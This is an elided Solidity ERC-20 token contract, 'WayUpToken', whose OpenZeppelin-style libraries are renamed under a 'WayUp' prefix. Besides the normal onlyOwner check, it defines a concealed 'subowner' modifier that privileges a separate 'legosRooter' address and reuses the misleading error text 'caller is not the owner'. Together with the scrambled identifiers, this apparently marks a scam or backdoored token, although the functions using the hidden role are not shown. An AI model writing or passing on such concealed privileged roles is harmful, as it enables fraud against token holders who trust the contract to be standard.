...
/*
 * @dev Provides information about the current execution WayUp20Burnable, including the
 ...
 */
abstract contract WayUp20Burnable {
...
// File: @openzeppelin/contracts/access/WayUp20Ownable.sol
 ...
 * the owner.
 */
abstract contract WayUp20Ownable is WayUp20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "WayUp20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "WayUp20Ownable: new owner is the zero address");
 ...
 * `SafeWayUp` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeWayUp {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeWayUp: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeWayUp: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeWayUp: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeWayUp: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeWayUp: modulo by zero");
  }
...
contract WayUpToken is WayUp20Burnable, WayUpinterface, WayUp20Ownable {
    
    using SafeWayUp for uint256;
    ...
    */
    ...
    /**
    * @dev See {WayUpinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {WayUpinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "WayUp20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {WayUpinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {WayUpinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {WayUpinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {WayUpinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {WayUpinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "WayUpinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {WayUpinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "WayUpinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "WayUpinterface: transfer from the zero address");
        require(shippingto != address(0), "WayUpinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "WayUpinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "WayUpinterface: approve from the zero address");
        require(transporteur != address(0), "WayUpinterface: approve to the zero address");
